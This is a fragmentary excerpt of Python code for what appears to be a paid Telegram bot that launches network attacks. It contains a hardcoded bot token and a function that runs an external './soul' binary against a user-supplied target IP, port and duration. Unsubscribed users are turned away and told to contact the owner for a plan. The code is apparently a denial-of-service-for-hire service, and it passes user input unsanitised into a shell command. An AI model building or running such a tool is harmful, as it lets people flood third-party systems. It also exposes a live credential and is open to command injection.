...
TOKEN = '8112158024:AAEm8_kYxsZ5yCSotWybdQBwXgLoZJLS0Cw'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 1")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @LION1684.*", parse_mode='Markdown')  # Contact owner message
            return
